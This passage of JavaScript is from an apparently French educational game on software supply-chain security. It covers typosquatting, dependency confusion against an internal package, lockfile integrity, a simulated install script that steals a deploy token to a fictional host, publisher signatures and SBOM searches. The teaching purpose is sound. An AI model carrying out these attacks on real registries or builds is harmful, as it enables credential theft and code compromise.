    if (!n) { out("Quel paquet ? `fiche colourize`", "err"); return; }
    const m = META[n] || ["—", "—", "—"];
    const vs = Object.keys(PKG[n].v).sort(cmp);
    out(`Fiche de ${n}`, "title");
    code(`téléchargements : ${m[0]}\nâge du paquet   : ${m[1]}\nmainteneur      : ${m[2]}\nversions        : ${vs.join(", ")}\nlicence         : ${LIC[n] || "—"}` + (n === "flux-stream" ? "\nhistorique      : 3.3.5 et 3.3.6 par brigitte ; 3.3.7 (il y a 4 jours) et 3.3.8 (cette nuit) par k-rando" : ""));
    if (n === "colourize") out("Un paquet de trois jours, 212 téléchargements, un mainteneur anonyme, à une lettre du paquet le plus populaire de la vitrine : ces signaux se cumulent.", "sys");
  }
  function reportCmd(c) {
    const x = F();
    if (!where("entrepot", "On signale un paquet à l'Entrepôt (nord de l'atelier).")) return;
    if (!x.cmp) { out("Compare d'abord les noms : `comparer`.", "sys"); return; }
    const n = pkgIn(c.rawArg);
    if (!n || !x.directs.includes(n)) { out("Quel paquet de ta liste ? `signaler ‹nom›`", "err"); return; }
    if (n !== "colourize") {
      const d = Math.min(...POP.map(p => lev(n, p)));
      say("Greffier", `« ${n} » est ${d === 0 ? "exactement un paquet populaire (distance 0)" : "à distance " + d + " d'un populaire"} : rien d'anormal à signaler. Regarde plutôt son âge, ses téléchargements, son mainteneur : \`fiche ${n}\`.`);
      return;
    }
    if (x.typo) { out("C'est déjà fait.", "sys"); return; }
    x.typo = true;
    x.directs = x.directs.map(d => (d === "colourize" ? "colorize" : d)); x.rng.colorize = x.rng.colourize; delete x.rng.colourize;
    out("Tu signales « colourize » : le registre le met en quarantaine. Dans le manifeste, tu le remplaces par « colorize » (le vrai : 8,4 M de téléchargements, 4 ans). Alice avoue, un peu rouge, avoir tapé le nom de mémoire ; Bob l'avait relu sans le voir.", "ok");
    out("Le paquet de Mallory contenait un script qui s'exécute à l'installation : tu auras l'occasion de voir ce genre de chose plus loin.", "sys");
    note("typo"); fig("arbre");
  }

  /* ---------- étape 2 : versions et confusion de dépendance ---------- */
  function resolveCmd(c) {
    const x = F();
    if (!where("entrepot", "La résolution se simule à l'Entrepôt (nord de l'atelier).")) return;
    if (!x.typo) { say("Greffier", "Commence par régler ton premier problème de nom (`comparer`)."); return; }
    const n = pkgIn(c.rawArg) || "halle-auth";
    if (n !== "halle-auth") {
      const rng = x.rng[n] || "*", vs = Object.keys(PKG[n].v), ok = vs.filter(v => sat(v, rng)), w = maxv(ok);
      out(`${n} demandé en ${rng} (${rangeText(rng)}) ; versions du registre public : ${vs.sort(cmp).join(", ")}. Le résolveur prend la plus haute qui convient : **${w || "aucune"}**.`, "sys");
      return;
    }
    resolveHalle(true);
  }
  function resolveHalle(show) {
    const x = F(), rng = x.rng["halle-auth"], privV = Object.keys(PKG["halle-auth"].v), privOk = privV.filter(v => sat(v, rng));
    const mv = x.routed ? null : malloryVer(rng, maxv(privV));
    const win = mv ? "pub" : privOk.length ? "priv" : "none";
    x.lastRes = { rng, priv: maxv(privOk), pub: mv, win, routed: !!x.routed };
    if (!show) return;
    out(`Résolution de halle-auth, plage demandée : ${rng} (${rangeText(rng)})`, "title");
    const lines = [`registre interne : ${privV.join(", ")}`];
    if (x.routed) lines.push("registre public  : non interrogé (règle de routage halle-* → interne seulement)");
    else lines.push(`registre public  : ${mv ? mv + "   (publié il y a 2 jours par « m4llory »)" : "aucune version dans la plage"}`);
    lines.push(`candidats dans ${rng} : ${[...privOk.map(v => v + " (interne)"), ...(mv ? [mv + " (PUBLIC)"] : [])].join(", ") || "aucun"}`);
    code(lines.join("\n"));
    if (win === "none") { out(`Aucune version ne satisfait ${rng}. Remets une plage cohérente : \`plage halle-auth ^1.4.0\`.`, "err"); fig("confusion"); return; }
    if (win === "pub") {
      out(`Le résolveur prend la plus haute : **${mv}** (public). C'est le code de Mallory qui entre dans l'application !`, "err");
      out("Mallory a lu ton manifeste (il traîne dans un dépôt, un journal de build…) : elle connaît le nom interne « halle-auth » et a publié sur le registre public un numéro plus haut, juste dans la plage. Ton outil n'a rien fait d'illégal : il a suivi la règle « la plus haute version qui convient ».", "err");
      if (!x.res) { x.res = true; note("semver"); note("confusion"); fig("confusion"); }
    } else {
      out(`Le résolveur prend **${maxv(privOk)}** (interne).`, "ok");
      if (!x.routed) {
        if (range(rng).hi && range(rng).hi[0] === range(rng).lo[0] && range(rng).hi[2] === range(rng).lo[2] + 1 && range(rng).hi[1] === range(rng).lo[1]) out("La plage est exacte : Mallory ne peut plus gagner au numéro (elle n'a rien de plus haut à proposer dans une plage d'une seule version). Mais cette protection est fragile : au premier changement de plage, au premier passage à une version voisine, ou si le registre interne est indisponible et que l'outil se rabat sur le public, le problème revient. Le nom, lui, est toujours ouvert.", "sys");
        else out("Cette fois la plage ne laisse aucune version plus haute à Mallory (elle sait choisir son numéro : relis `resoudre` après chaque changement de plage). Mais elle n'a qu'à publier un numéro dans la nouvelle plage : tout repose sur un nom que le registre public peut servir.", "sys");
      } else out("Les noms internes ne sont plus cherchés sur le registre public : le numéro de version de Mallory n'est même plus comparé.", "ok");
      if (x.res) fig("confusion");
    }
  }
  function rangeCmd(c) {
    const x = F();
    const n = pkgIn(c.rawArg);
    const m = /(?:>=|\^|~)?\d+\.\d+\.\d+|\*/.exec(c.rawArg.replace(/^.*?(?=[\^~>*\d])/, ""));
    if (!n || !x.directs.includes(n) || !m || !range(m[0])) { out("Syntaxe : `plage ‹paquet› ‹plage›` avec ^1.4.0, ~1.4.0, 1.4.2 (exacte), >=1.4.0 ou *. Exemple : `plage halle-auth ~1.4.0`.", "err"); return; }
    x.rng[n] = m[0];
    out(`Dans le manifeste, ${n} devient « ${m[0]} » : ${rangeText(m[0])}.`, "ok");
    if (n === "halle-auth") out("`resoudre halle-auth` pour voir ce que choisit le résolveur.", "sys");
    if (!x.sawRange) { x.sawRange = true; if (!x.res) note("semver"); }
  }
  function sortCmd(c) {
    const vs = c.rawArg.match(/\d+\.\d+\.\d+/g);
    if (!vs || vs.length < 2) { out("Donne au moins deux versions : `trier 1.10.0 1.9.0 1.2.10`", "err"); return; }
    const lex = vs.slice().sort(), sem = vs.slice().sort(cmp);
    code(`ordre alphabétique (FAUX) : ${lex.join("  <  ")}\nordre sémantique (bon)    : ${sem.join("  <  ")}`);
    out("Chaque champ se compare comme un nombre : 10 est plus grand que 9, alors que « 10 » vient avant « 9 » alphabétiquement.", "sys");
    note("semver");
  }
  function configCmd(c) {
    const x = F(), t = norm(c.rawArg);
    if (!where("entrepot", "La configuration des registres se règle à l'Entrepôt (nord de l'atelier).")) return;
    if (!x.res) { say("Greffier", "Avant de changer la configuration, constate le problème : `resoudre halle-auth`."); return; }
    if (x.routed) { out("Le routage est déjà en place.", "sys"); return; }
    if (/halle/.test(t) && /intern|prive/.test(t)) {
      x.routed = true;
      out("Règle ajoutée : « halle-* » ne se cherche que dans le registre interne. Le public n'est plus consulté pour ces noms.", "ok");
      resolveHalle(true);
      out("Autre parade complémentaire : des noms à portée (@guilde/auth) dont la portée est réservée à la Guilde sur le registre public.", "sys");
    } else if (/^\s*$/.test(t)) out("Quelle règle ? `configurer halle-* interne`", "err");
    else if (/\*/.test(c.rawArg) && !/halle/.test(t)) out("Router TOUT vers l'interne casserait l'accès aux paquets publics (sauf à faire relayer le public par le registre interne : autre chantier). Cible seulement les noms internes : `configurer halle-* interne`.", "err");
    else out("Cette règle ne vise pas les noms internes de la Guilde (halle-*). Essaie `configurer halle-* interne`.", "err");
  }

  /* ---------- étape 3 : verrou et intégrité ---------- */
  const diffHex = (a, b) => { let n = 0; for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) n++; return n; };
  function installCmd(c) {
    const x = F(), a = norm(c.rawArg);
    if (!x.routed) { out("Pas encore : le manifeste doit d'abord être propre (noms et résolution : à l'Entrepôt).", "sys"); return; }
    if (/\blibre\b|sans verrou/.test(a)) { installLibre(); return; }
    if (/officiel/.test(a)) {
      if (!x.instFail) { say("Gabelou", "Lance d'abord l'installation normale, que je te montre ce qui ne va pas."); return; }
      if (!x.hashSeen) { say("Gabelou", "Comprends d'abord ce qui est arrivé : `empreinte chronos`."); return; }
      x.src = "officiel";
    }
    const ns = nodes();
    out(`Installation verrouillée (« ci ») : le verrou fait foi. Source : ${x.src === "officiel" ? "registre officiel" : "miroir de la rue basse"}. ${ns.length} paquets dans l'arbre.`, "sys");
    const rows = ns.map(n => { const got = sha256(served(n.name, n.ver)), exp = x.lock[n.name] ? x.lock[n.name].h : ""; return { n, got, exp, ok: got === exp }; });
    code("1/3 intégrité\n" + rows.map(r => `${r.ok ? "✓" : "✗"} ${(r.n.name + "@" + r.n.ver).padEnd(22)} ${r.ok ? short(r.got) + " = verrou" : "reçu " + short(r.got) + " ≠ attendu " + short(r.exp)}`).join("\n"));
    const bad = rows.filter(r => !r.ok);
    if (bad.length) {
      const b = bad[0];
      x.instFail = true; x.lastInt = { name: b.n.name + "@" + b.n.ver, exp: b.exp, got: b.got };
      out(`INSTALLATION REFUSÉE : l'archive ${b.n.name}@${b.n.ver} reçue ne correspond pas à l'empreinte du verrou. Rien n'est installé.`, "err");
      out("Tu n'as pas eu besoin de savoir ce qui a changé pour être protégé : un octet de différence suffit. À toi de comprendre : `empreinte chronos`.", "sys");
      note("lock"); fig("integrite");
      return;
    }
    if (!x.instOk) { x.instOk = true; x.lastInt = { name: "chronos@2.1.0", exp: x.lock.chronos.h, got: x.lock.chronos.h }; out("Toutes les empreintes correspondent au verrou : tu installes exactement ce que tu as audité. (Le colis du miroir était trafiqué ; celui du registre officiel est conforme au verrou.)", "ok"); fig("integrite"); }
    else out("Toutes les empreintes correspondent au verrou.", "ok");
    // phase 2 : scripts
    let blocked = false;
    if (!x.etuveOn) out("2/3 scripts : traités plus tard, à l'étuve. (Pour l'instant l'installation s'arrête avant d'exécuter quoi que ce soit.)", "sys");
    else {
      const withScr = ns.filter(n => PKG[n.name].v[n.ver].s), L = ["2/3 scripts d'installation"];
      let missing = false;
      for (const n of withScr) {
        const allowed = !x.ignore || x.allow.includes(n.name), sc = scan(n.name);
        if (!allowed) { L.push(`– ${n.name}@${n.ver} : script ignoré (ignore-scripts)`); if (n.name === "tz-data") missing = true; continue; }
        if (sc.env || sc.net) {
          L.push(`✗ ${n.name}@${n.ver} : ${PKG[n.name].v[n.ver].s}`);
          if (sc.env) L.push("    lit la variable d'environnement HALLE_DEPLOY_TOKEN");
          if (sc.net) L.push(`    tente une connexion sortante vers ${sc.host}:443 : BLOQUÉE par l'étuve`);
          blocked = true; x.scrBadSeen = true;
        } else L.push(`✓ ${n.name}@${n.ver} : ${PKG[n.name].v[n.ver].s}  (lit data/zones.txt, écrit tables.json : local seulement)`);
      }
      code(L.join("\n"));
      if (blocked) { out("Dans l'étuve, l'attaque est notée et bloquée. Chez toi, sur ton serveur de déploiement, rien ne l'aurait arrêtée : le jeton HALLE_DEPLOY_TOKEN serait parti chez Mallory.", "err"); note("scripts"); fig("arbre"); out("Installation interrompue. Coupe les scripts par défaut : `desactiver scripts`.", "sys"); return; }
      if (missing) { out("Installation terminée, mais l'application ne démarre pas : tz-data n'a pas construit ses tables (son script a été ignoré). Les scripts légitimes doivent être autorisés par leur nom : `autoriser tz-data`.", "err"); return; }
      if (!x.scrOk) { x.scrOk = true; out("Scripts : seuls ceux que tu as autorisés ont tourné, et tu les as lus.", "ok"); }
    }
    // phase 3 : signatures
    if (!x.policy) out("3/3 signatures : non exigées pour l'instant.", "sys");
    else {
      const v = x.lock["flux-stream"].v, [claim] = SIGS[v], s = sigOf(v), ok = modpow(s, E, KEYS[claim].n) === hnum(content("flux-stream", v));
      code(`3/3 signatures (annuaire des éditeurs)\n${ok && claim === "brigitte" ? "✓" : "✗"} flux-stream@${v} signé par ${claim}, éditeur autorisé : brigitte`);
      if (!(ok && claim === "brigitte")) { out("Signature non conforme : installation refusée.", "err"); return; }
      if (x.etuveOn && x.scrOk && !x.instFinal) { x.instFinal = true; out("Installation complète : intégrité vérifiée, scripts maîtrisés, éditeur contrôlé. La chaîne d'approvisionnement de Halle est durcie.", "ok"); return; }
    }
    if (x.instFinal) out("Installation complète : rien à signaler.", "ok");
  }
  function installLibre() {
    const x = F();
    if (!x.instOk) { say("Gabelou", "Repasse d'abord par l'installation vérifiée (`installer officiel`)."); return; }
    const ft = floatTree();
    const rows = ft.map(r => {
      const lv = x.lock[r.name] ? x.lock[r.name].v : "—";
      return `${"  ".repeat(r.depth)}${r.name.padEnd(18 - 2 * r.depth)} ${(r.spec).padEnd(7)} → ${String(r.ver).padEnd(7)} ${r.ver === lv ? "" : "≠ verrou (" + lv + ")"}`;
    });
    out("Installation SANS verrou : le résolveur prend la plus haute version de chaque plage.", "sys");
    code(rows.join("\n"));
    const dDir = ft.filter(r => r.depth === 0 && x.lock[r.name] && r.ver !== x.lock[r.name].v).length;
    const dTr = ft.filter(r => r.depth > 0 && (!x.lock[r.name] || r.ver !== x.lock[r.name].v)).length;
    if (!x.libre) { x.libre = true; }
    if (dDir) out(`${dDir} dépendance(s) directe(s) et ${dTr} transitive(s) ne sont plus celles que tu as auditées` + (ft.some(r => r.name === "flux-codec") ? ", et un paquet jamais vu (flux-codec) entre dans l'arbre via flux-stream" : "") + ". Personne ne les a relues : elles sont apparues « toutes seules ». Les plages ne figent rien ; fige-les : `epingler tout`.", "err");
    else out(`Tes dépendances directes sont épinglées : elles ne bougent plus. Mais ${dTr} dépendance(s) transitive(s) ont changé de version (${ft.filter(r => r.depth > 0 && x.lock[r.name] && r.ver !== x.lock[r.name].v).map(r => r.name + " " + x.lock[r.name].v + " → " + r.ver).join(", ")}) : épingler les directes ne suffit pas, c'est le verrou qui fige l'arbre entier.`, "ok");
  }
  function hashCmd(c) {
    const x = F();
    if (!where("douane", "Les empreintes se calculent à la douane (est de l'atelier).")) return;
    if (!x.instFail) { say("Gabelou", "Lance d'abord `installer` : je te dirai quel colis pose problème."); return; }
    const n = pkgIn(c.rawArg);
    if (!n || !x.lock[n]) { out("Quel colis ? `empreinte chronos` (n'importe quel paquet du verrou : expresso, chronos, requete…).", "err"); return; }
    const v = x.lock[n].v, body = served(n, v), got = sha256(body), exp = x.lock[n].h;
    out(`Archive ${n}@${v} (${x.src === "officiel" ? "registre officiel" : "miroir de la rue basse"}) :`, "sys");
    code(body);
    out("Calcul de SHA-256 de ce contenu :", "sys");
    code(`reçu     ${got}\nverrou   ${exp}`);
    if (got === exp) out("Identique : l'archive est celle que tu as auditée.", "ok");
    else {
      out(`${diffHex(got, exp)} caractères sur 64 diffèrent : un seul ajout dans l'archive (la dernière ligne) change l'empreinte presque entièrement. C'est elle que le miroir de la rue basse a glissée (Ève, qui écoute le trafic de la rue basse, avait repéré ce relais sans pouvoir l'empêcher). Le colis est refusé, quelle que soit sa provenance.`, "err");
      x.lastInt = { name: n + "@" + v, exp, got };
    }
    x.hashSeen = true; fig("integrite");
  }
  function pinCmd(c) {
    const x = F();
    if (!x.instOk) { say("Gabelou", "Termine d'abord l'installation vérifiée."); return; }
    const t = norm(c.rawArg), n = pkgIn(c.rawArg);
    let list;
    if (/tout|tous/.test(t)) list = x.directs; else if (n && x.directs.includes(n)) list = [n]; else { out("Quoi épingler ? `epingler tout` ou `epingler expresso`", "err"); return; }
    const ch = [];
    for (const d of list) { const v = verIn(c.rawArg) && list.length === 1 && PKG[d].v[verIn(c.rawArg)] ? verIn(c.rawArg) : x.lock[d].v; if (x.rng[d] !== v) { x.rng[d] = v; ch.push(`${d} → ${v}`); } }
    out(ch.length ? "Épinglé : " + ch.join(", ") + "." : "Déjà épinglé.", "ok");
    if (allPinned()) out("Toutes tes dépendances directes sont à version exacte. Les transitives restent à la charge du verrou. (`installer libre` permet de le constater.)", "sys");
    note("pin"); fig("arbre");
  }

  /* ---------- étape 4 : scripts ---------- */
  function listCmd(c) {
    const x = F();
    if (!where("etuve", "Les scripts se listent à l'étuve (ouest de l'atelier).")) return;
    if (!/script/.test(norm(c.rawArg))) { out("`lister scripts`", "err"); return; }
    const ns = nodes().filter(n => PKG[n.name].v[n.ver].s);
    out(`${ns.length} paquet(s) de l'arbre (sur ${nodes().length}) ont un script d'installation. Analyse statique de leur code :`, "sys");
    code(ns.map(n => { const f = flagsText(scan(n.name)); return `${(n.name + "@" + n.ver).padEnd(22)} postinstall : ${PKG[n.name].v[n.ver].s}\n   ${f.length ? "⚠ " + f.join(" ; ") : "rien de suspect"}`; }).join("\n"));
    x.scrList = true;
    out("Un script qui lit l'environnement ET ouvre le réseau mérite d'être lu : `ouvrir ‹paquet›`.", "sys");
  }
  function openCmd(c) {
    const x = F();
    if (!where("etuve", "Les scripts s'ouvrent à l'étuve (ouest de l'atelier).")) return;
    const n = pkgIn(c.rawArg);
    if (!n || !SCR[n]) { out("Quel script ? `ouvrir cookie-jar-lite` ou `ouvrir tz-data`.", "err"); return; }
    if (!x.scrList) { say("Veilleur", "Fais d'abord l'inventaire : `lister scripts`."); return; }
    code(`${n} : ${SCR[n].cmd}\n\n${SCR[n].src}`);
    const f = flagsText(scan(n));
    if (f.length) { out(`Ce script ${f.join(" et ")}. Pour une dépendance de gestion de cookies, c'est exactement ce qu'il ne devrait pas faire : il envoie ton jeton de déploiement chez Mallory (domaine fictif de l'exercice).`, "err"); x.scrOpen = true; }
    else out("Bénin : il lit un fichier de l'archive et en écrit un autre, rien de plus.", "ok");
  }
  function disableCmd(c) {
    const x = F();
    if (!/script/.test(norm(c.rawArg))) { out("Que désactiver ? `desactiver scripts`", "err"); return; }
    if (!where("etuve", "Ça se règle à l'étuve (ouest de l'atelier).")) return;
    if (!x.scrBadSeen) { say("Veilleur", "Vois d'abord ce que font ces scripts quand on les laisse tourner : `installer`."); return; }
    if (x.ignore) { out("Déjà désactivés.", "sys"); return; }
    x.ignore = true;
    out("Réglage « ignorer-scripts » activé : plus aucun script d'installation ne tourne, sauf ceux que tu autoriseras. Relance `installer` pour voir.", "ok");
  }
  function allowCmd(c) {
    const x = F();
    if (!where("etuve", "Ça se règle à l'étuve (ouest de l'atelier).")) return;
    const n = pkgIn(c.rawArg);
    if (!x.ignore) { out("Inutile pour l'instant : tous les scripts tournent. Coupe-les d'abord (`desactiver scripts`).", "sys"); return; }
    if (n === "cookie-jar-lite") { say("Veilleur", "Celui-là ? Il vole le jeton. Il n'a besoin d'aucun script pour fonctionner : on ne l'autorise pas."); return; }
    if (n !== "tz-data") { out("Seuls tz-data et cookie-jar-lite ont un script. `autoriser tz-data`", "err"); return; }
    if (!x.allow.includes(n)) x.allow.push(n);
    out("tz-data est autorisé par son nom (liste d'autorisation) : son script, lu et bénin, tournera. Relance `installer`.", "ok");
  }

  /* ---------- étape 5 : mainteneur compromis, signatures ---------- */
  function proposeCmd() {
    const x = F();
    if (!where("sceaux", "Le bot de mises à jour se consulte au bureau des sceaux (est de l'Entrepôt).")) return;
    const cur = x.lock["flux-stream"].v, nv = "3.3.7";
    const added = Object.keys(PKG["flux-stream"].v[nv].d).filter(d => !PKG["flux-stream"].v[cur].d[d]);
    out("Le bot de mises à jour propose :", "sys");
    code(`flux-stream ${cur} → ${nv}   « correctifs mineurs »\n${added.map(a => `  + nouvelle dépendance : ${a} ${PKG["flux-stream"].v[nv].d[a]}  (créé il y a ${META[a][1]} ; téléchargements : ${META[a][0]})`).join("\n")}\ntests de l'application : verts`);
    out("Un correctif mineur qui ajoute une dépendance inconnue : suspect. Les tests verts ne prouvent rien (le code piégé ne casse rien). Vérifie QUI a publié : `authentifier flux-stream 3.3.7`. Tu peux aussi voir `fiche flux-stream`.", "sys");
    x.prop = true; fig("arbre");
  }
  function authCmd(c) {
    const x = F();
    if (!where("sceaux", "La vérification d'éditeur se fait au bureau des sceaux (est de l'Entrepôt).")) return;
    const n = pkgIn(c.rawArg);
    if (n && n !== "flux-stream") { out(`${n} n'a pas d'entrée dans l'annuaire des éditeurs de ce bureau : seule la signature de flux-stream est contrôlée dans le jeu. (En vrai, c'est inégal selon les écosystèmes.)`, "sys"); return; }
    const ver = verIn(c.rawArg) || x.lock["flux-stream"].v;
    if (!SIGS[ver]) { out(`Versions connues de flux-stream : ${Object.keys(SIGS).join(", ")}. Exemple : \`authentifier flux-stream 3.3.7\`.`, "err"); return; }
    const [claim] = SIGS[ver], cn = claim === "krando" ? "k-rando" : claim, body = content("flux-stream", ver), h = hnum(body), s = sigOf(ver), key = KEYS[claim];
    const back = modpow(s, E, key.n), valid = back === h, authorized = claim === "brigitte", prov = /^attest/.test(PROV[ver]);
    code([
      `archive      flux-stream@${ver}`,
      `SHA-256      ${sha256(body).slice(0, 18)}…  →  h = ${h}`,
      `signature    s = ${s}   (déclarée par « ${cn} »)`,
      `clé publique de ${cn} : n = ${key.n}, e = ${E}`,
      `vérification s^e mod n = ${back}   ${valid ? "= h : ✓ la signature est authentique" : "≠ h : ✗ signature INVALIDE (forgée ou archive modifiée)"}`,
      `éditeur      autorisé pour flux-stream (annuaire) : brigitte   →   ${authorized ? "✓" : "✗ « " + cn + " » n'est pas autorisé"}`,
      `provenance   ${PROV[ver]}   →   ${prov ? "✓" : "✗"}`,
      `verdict      ${valid && authorized && prov ? "ACCEPTER" : "REFUSER"}`,
    ].join("\n"));
    x.authRes[ver] = valid ? (authorized ? "ok" : "unauth") : "forged";
    if (valid && authorized && prov) out("Signature authentique, bon éditeur, provenance attestée : cette version est fiable.", "ok");
    else if (valid) out("La signature est mathématiquement parfaite, et pourtant : elle est faite par la clé de k-rando, pas par celle de Brigitte. Une signature prouve QUI a signé, pas que ce signataire est légitime pour ce paquet. C'est tout le cas event-stream : le nouveau mainteneur était « officiel » aux yeux du registre.", "err");
    else out("La signature ne se vérifie pas avec la clé de Brigitte : quelqu'un a mis son nom sur une archive qu'il n'a pas pu signer. Impossible à falsifier sans sa clé privée.", "err");
    if (ver === "3.3.7") x.auth37 = true;
    if (!x.sigNote) { x.sigNote = true; note("signature"); }
    fig("chaine");
  }
  function acceptCmd() {
    const x = F();
    if (!where("sceaux", "Les mises à jour se décident au bureau des sceaux (est de l'Entrepôt).")) return;
    if (!x.prop) { out("Il n'y a aucune proposition en cours : `proposition`.", "sys"); return; }
    if (!x.auth37) { say("Brigitte", "Tu acceptes sans avoir vérifié l'éditeur ? Regarde d'abord : `authentifier flux-stream 3.3.7`."); return; }
    out("Tu fusionnes la mise à jour. Le verrou est régénéré : flux-stream 3.3.7, flux-codec 0.1.0, avec leurs empreintes. L'installation vérifiée PASSE : les empreintes sont celles de l'archive piégée, puisque c'est elle qu'on a enregistrée.", "err");
    out("Moralité : le verrou garantit que tu installes ce que tu as enregistré, pas que c'est sain. Sans contrôle d'éditeur, il a protégé l'attaquant. Par chance, la Guilde est en simulation : tu annules (retour à 3.3.6). Refuse plutôt : `refuser`.", "sys");
    x.badAccept = true;
  }
  function refuseCmd() {
    const x = F();
    if (!where("sceaux", "Les mises à jour se décident au bureau des sceaux (est de l'Entrepôt).")) return;
    if (!x.prop) { out("Il n'y a aucune proposition en cours : `proposition`.", "sys"); return; }
    if (!x.auth37) { say("Brigitte", "Refuser sans preuve, c'est bien, mais autant comprendre pourquoi : `authentifier flux-stream 3.3.7`."); return; }
    if (x.refused) { out("C'est déjà refusé.", "sys"); return; }
    x.refused = true;
    out("Proposition refusée : flux-stream reste épinglé à la 3.3.6, signée par Brigitte. Tu préviens le registre au sujet de k-rando et de la 3.3.8 usurpée. Brigitte retire les droits de publication de k-rando.", "ok");
    fig("arbre");
  }
  function requireCmd(c) {
    const x = F();
    if (!where("sceaux", "La politique se décide au bureau des sceaux (est de l'Entrepôt).")) return;
    if (!/signature/.test(norm(c.rawArg))) { out("`exiger signatures`", "err"); return; }
    if (!x.refused) { say("Brigitte", "Règle d'abord le cas de la proposition en cours (`refuser`)."); return; }
    if (x.policy) { out("C'est déjà exigé.", "sys"); return; }
    x.policy = true;
    out("Politique activée : à l'installation, un paquet de l'annuaire doit porter une signature valide d'un éditeur autorisé. Désormais, même une mise à jour acceptée par mégarde, ou une archive qui ne vient pas de Brigitte, serait refusée sans dépendre de ta vigilance. Relance `installer` pour tout vérifier.", "ok");
    fig("chaine");
  }

  /* ---------- étape 6 : SBOM ---------- */
  function sbomCmd(c) {
    const x = F();
    if (!where("archives", "Les nomenclatures sont aux archives (sud de l'atelier).")) return;
    if (!x.alert) { say("Archiviste", "Viens, je te montre : parle-moi d'abord (`parler archiviste`)."); return; }
    const t = norm(c.rawArg), app = /boutique/.test(t) ? "boutique" : /phare/.test(t) ? "phare" : /halle/.test(t) ? "halle" : null;
    if (!app) { out("Quelle application ? `sbom halle`, `sbom boutique` ou `sbom phare`.", "err"); return; }
    const sb = sboms()[app], its = sb.items;
    out(`SBOM de ${app} ${sb.ver} (format simplifié, dans l'esprit de CycloneDX et SPDX)`, "sys");
    code("composant                 version  source   licence     empreinte\n" + its.map(i => `${((i.via ? "└ " : "") + i.name).padEnd(24)}  ${i.ver.padEnd(7)}  ${(i.name === "halle-auth" ? "interne" : "public").padEnd(7)}  ${(LIC[i.name] || "").padEnd(10)}  ${short(i.h)}${vulnerable(i.name, i.ver) ? "   ⚠ " + ADV.id : ""}`).join("\n"));
    out(`${its.length} composants : ${its.filter(i => !i.via).length} directs, ${its.filter(i => i.via).length} transitifs.`, "sys");
    x.sbomSeen = true;
  }
  function searchCmd(c) {
    const x = F();
    if (!where("archives", "La recherche se fait aux archives (sud de l'atelier).")) return;
    if (!x.alert) { say("Archiviste", "Parle-moi d'abord : `parler archiviste`."); return; }
    const n = pkgIn(c.rawArg);
    if (!n) { out("Quel paquet ? `chercher mime-lite`", "err"); return; }
    const sb = sboms();
    const direct = [], full = [];
    for (const app in sb) for (const i of sb[app].items) if (i.name === n) { full.push({ app, i }); if (!i.via) direct.push({ app, i }); }
    out(`Recherche de ${n} dans les manifestes (dépendances directes seulement) :`, "sys");
    code(direct.length ? direct.map(d => `${d.app.padEnd(9)} ${n} ${d.i.ver}   (direct)${vulnerable(n, d.i.ver) ? "   ⚠ VULNÉRABLE" : ""}`).join("\n") : "aucun résultat");
    out(`Recherche de ${n} dans les SBOM (arbre complet) :`, "sys");
    code(full.length ? full.map(d => `${d.app.padEnd(9)} ${n} ${d.i.ver}   ${d.i.via ? "via " + d.i.via : "(direct)"}${vulnerable(n, d.i.ver) ? "   ⚠ VULNÉRABLE" : "   ok"}`).join("\n") : "aucun résultat");
    if (n === ADV.pkg) {
      const vul = full.filter(d => vulnerable(n, d.i.ver));
      if (x.fixed) out("Plus aucune version vulnérable dans les inventaires.", "ok");
      else out(`${direct.length} application dans les manifestes, mais ${full.length} dans les SBOM, dont ${vul.length} vulnérable(s) (< ${ADV.fixed}). Halle ne déclare même pas mime-lite : il arrive par expresso. Corrige : \`corriger mime-lite 1.2.5\`.`, "err");
      x.srch = true; note("sbom"); fig("sbom");
    } else out(`(L'alerte du jour ne concerne que ${ADV.pkg}.)`, "sys");
  }
  function fixCmd(c) {
    const x = F();
    if (!where("archives", "La correction se décide aux archives (sud de l'atelier).")) return;
    if (!x.alert) { say("Archiviste", "Quelle correction ? Parle-moi d'abord : `parler archiviste`."); return; }
    const n = pkgIn(c.rawArg), v = verIn(c.rawArg);
    if (n !== ADV.pkg || !v) { out("`corriger mime-lite 1.2.5` : le paquet à corriger et la version à imposer.", "err"); return; }
    if (!PKG[n].v[v]) { out(`mime-lite ${v} n'existe pas dans le registre. Versions : ${Object.keys(PKG[n].v).join(", ")}.`, "err"); return; }
    if (vulnerable(n, v)) { out(`mime-lite ${v} est encore vulnérable : le correctif est publié depuis la ${ADV.fixed}.`, "err"); return; }
    if (!x.srch) { say("Archiviste", "Mesure d'abord l'étendue : `chercher mime-lite`."); return; }
    x.over = v;
    out(`Surcharge ajoutée dans les manifestes : mime-lite est forcé à ${v} pour toutes les applications, directes comme transitives (c'est le rôle d'un « override » ou d'une « résolution » : on remplace la version choisie plus bas dans l'arbre).`, "ok");
    x.fixed = true;
    searchCmd({ rawArg: "mime-lite" });
    out("Après la correction, on régénère les SBOM, on relance les tests, et on vérifie à chaque publication : l'inventaire n'a de valeur que s'il est à jour.", "sys");
  }

  /* ---------- fin ---------- */
  function treeCmd() {
    const x = F(), ns = nodes();
    const L = ["halle-port443"];
    x.directs.forEach((d, i) => {
      const last = i === x.directs.length - 1;
      const node = ns.find(n => n.name === d);
      L.push(`${last ? "└─" : "├─"} ${d} ${node.ver} (${x.rng[d]})${d === "halle-auth" ? "  [interne]" : ""}`);
      ns.filter(n => n.parent === d).forEach(ch => L.push(`${last ? "   " : "│  "}└─ ${ch.name} ${ch.ver}${PKG[ch.name].v[ch.ver].s ? "  [script d'installation]" : ""}`));
    });
    code(L.join("\n"));
    out(`${x.directs.length} dépendances directes, ${ns.length - x.directs.length} transitives : ${ns.length} paquets au total, que tu n'as écrits ni l'un ni l'autre.`, "sys");
    fig("arbre");
  }

  function ending() {
    const x = F(); x.end = true;
    out("Épilogue", "title");
    say("Maître Ada", "Regarde ce que tu as fait. Un nom suspect a été retiré, un nom interne ne peut plus être usurpé, chaque archive est comparée à son empreinte, les scripts sont coupés sauf un, l'éditeur de flux-stream est contrôlé, et nous savons en une minute où se cache une vulnérabilité. Mallory n'a rien forcé : elle comptait sur notre confiance automatique. Elle l'aura plus dure.");
    debrief();
    out("FIN. `carnet` pour relire tes notes, `analogies` pour revoir ce bilan, `recommencer` pour rejouer.", "title");
  }
  function debrief() {
    out("Comment ça marche vraiment : les analogies décodées", "title");
    out("**L'Entrepôt = un registre public de paquets** (npm, PyPI, crates.io, Maven Central…). N'importe qui peut y publier. **Le manifeste = package.json, requirements.txt, Cargo.toml…** : tes dépendances directes, avec des plages de versions. **L'arbre** inclut les dépendances transitives, souvent des dizaines de fois plus nombreuses.");
